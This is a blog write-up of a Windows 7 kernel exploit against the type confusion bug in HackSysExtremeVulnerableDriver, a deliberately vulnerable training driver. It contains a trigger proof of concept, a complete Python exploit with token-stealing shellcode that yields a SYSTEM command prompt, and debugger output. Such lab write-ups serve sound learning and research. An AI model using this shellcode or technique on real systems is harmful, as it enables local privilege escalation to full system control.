---
layout:     post
title:      HackSysExtremeVulnerableDriver TypeConfusion
author:     wooy0ung
tags:       hevd
category:   exploit
---

- 目录
{:toc #markdown-toc}

>[Analysis Environment]  
>guest machine: Windows 7 x86 sp0  
>host machine: Windows 10  
>necessary tools: VirtualKD[[here]](http://virtualkd.sysprogs.org/)、OSRloader[[here]](https://www.osronline.com/article.cfm?article=157)、HackSysExtremeVulnerableDriver[[here]](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver)、Windbg  
<!-- more -->


## 0x001 Test POC

Save this code as python script file.
```
import sys
from ctypes import *

kernel32 = windll.kernel32
hevDevice = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",0xc0000000,0,None,0x3,0,None)

if not hevDevice or hevDevice == -1:
	print "[-] Couldn't get Device Driver handle."
	sys.exit(0)
buf = "A"*4 + "B"*4
buflen = len(buf)

kernel32.DeviceIoControl(hevDevice,0x222023,buf,buflen,None,0,byref(c_ulong()),None)
```

Let's trigger the vulnerability.
```
****** HACKSYS_EVD_IOCTL_TYPE_CONFUSION ******
[+] Pool Tag: 'kcaH'
[+] Pool Type: NonPagedPool
[+] Pool Size: 0x8
[+] Pool Chunk: 0x86CB4550
[+] UserTypeConfusionObject: 0x01B1B634
[+] KernelTypeConfusionObject: 0x86CB4550
[+] KernelTypeConfusionObject Size: 0x8
[+] KernelTypeConfusionObject->ObjectID: 0x41414141
[+] KernelTypeConfusionObject->ObjectType: 0x42424242
[+] Triggering Type Confusion
[+] KernelTypeConfusionObject->Callback: 0x42424242
[+] Calling Callback
[-] Exception Code: 0xC0000005
****** HACKSYS_EVD_IOCTL_TYPE_CONFUSION ******
```
We find that a Exception has been catch beacase of trying to call a illegal Addr at TypeConfusionObjectInitializer method.
![](/assets/img/exploit/2018-08-08-hacksys-extreme-vulnerable-driver-typeconfusion/0x001.png)


## 0x002 Exploit it!

By reading the source code, I get a structure. We may set the ObjectType with our shellcode Addr.
```
typedef struct _USER_TYPE_CONFUSION_OBJECT {
	ULONG ObjectID;
	ULONG ObjectType;
} USER_TYPE_CONFUSION_OBJECT, *PUSER_TYPE_CONFUSION_OBJECT;
```

Compared with the previous challenge, this is relatively simple. Enjoy our exploit~
```
import sys,struct
from ctypes import *
from subprocess import *

def main():
	kernel32 = windll.kernel32
	hevDevice = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",0xc0000000,0,None,0x3,0,None)

	if not hevDevice or hevDevice == -1:
		print "[-] Couldn't get Device Driver handle."
		sys.exit(0)
	
	shellcode = ""
	shellcode += bytearray(
		"\xcc"
		"\x60"                            # pushad
		"\x31\xc0"                        # xor eax,eax
		"\x64\x8b\x80\x24\x01\x00\x00"    # mov eax,[fs:eax+0x124]
		"\x8B\x80\x50\x01\x00\x00"        # mov eax,[eax+0x150]
		"\x89\xc1"                        # mov ecx,eax
		"\xba\x04\x00\x00\x00"            # mov edx,0x4
		"\x8b\x80\xb8\x00\x00\x00"        # mov eax,[eax+0xb8]
		"\x2d\xb8\x00\x00\x00"            # sub eax,0xb8
		"\x39\x90\xb4\x00\x00\x00"        # cmp [eax+0xb4],edx
		"\x75\xed"                        # jnz 0x1a
		"\x8b\x90\xf8\x00\x00\x00"        # mov edx,[eax+0xf8]
		"\x89\x91\xf8\x00\x00\x00"        # mov [ecx+0xf8],edx
		"\x61"                            # popad
		"\x5d"                            # pop ebp
		"\xc2\x08\x00"                    # ret 0x8
	)

	ptr = kernel32.VirtualAlloc(c_int(0),c_int(len(shellcode)),c_int(0x3000),c_int(0x40))
	buff = (c_char * len(shellcode)).from_buffer(shellcode)
	kernel32.RtlMoveMemory(c_int(ptr),buff,c_int(len(shellcode)))
	shellcode_final = struct.pack("<L",ptr)

	buf = "A"*4 + shellcode_final
	buflen = len(buf)

	kernel32.DeviceIoControl(hevDevice,0x222023,buf,buflen,None,0,byref(c_ulong()),None)

	Popen("start cmd",shell=True)

if __name__ == "__main__":
	main()
```

pwn~
```
****** HACKSYS_EVD_IOCTL_TYPE_CONFUSION ******
[+] Pool Tag: 'kcaH'
[+] Pool Type: NonPagedPool
[+] Pool Size: 0x8
[+] Pool Chunk: 0x86C9E838
[+] UserTypeConfusionObject: 0x01BC18F4
[+] KernelTypeConfusionObject: 0x86C9E838
[+] KernelTypeConfusionObject Size: 0x8
[+] KernelTypeConfusionObject->ObjectID: 0x41414141
[+] KernelTypeConfusionObject->ObjectType: 0x00380000
[+] Triggering Type Confusion
[+] KernelTypeConfusionObject->Callback: 0x00380000
[+] Calling Callback
Breakpoint 0 hit
HEVD!TypeConfusionObjectInitializer+0x20:
96e98742 83c40c          add     esp,0Ch
kd> u 0x00380000 L1a
00380000 cc              int     3
00380001 60              pushad
00380002 31c0            xor     eax,eax
00380004 648b8024010000  mov     eax,dword ptr fs:[eax+124h]
0038000b 8b8050010000    mov     eax,dword ptr [eax+150h]
00380011 89c1            mov     ecx,eax
00380013 ba04000000      mov     edx,4
00380018 8b80b8000000    mov     eax,dword ptr [eax+0B8h]
0038001e 2db8000000      sub     eax,0B8h
00380023 3990b4000000    cmp     dword ptr [eax+0B4h],edx
00380029 75ed            jne     00380018
0038002b 8b90f8000000    mov     edx,dword ptr [eax+0F8h]
00380031 8991f8000000    mov     dword ptr [ecx+0F8h],edx
00380037 61              popad
00380038 5d              pop     ebp
00380039 c20800          ret     8
```
![](/assets/img/exploit/2018-08-08-hacksys-extreme-vulnerable-driver-typeconfusion/0x002.png)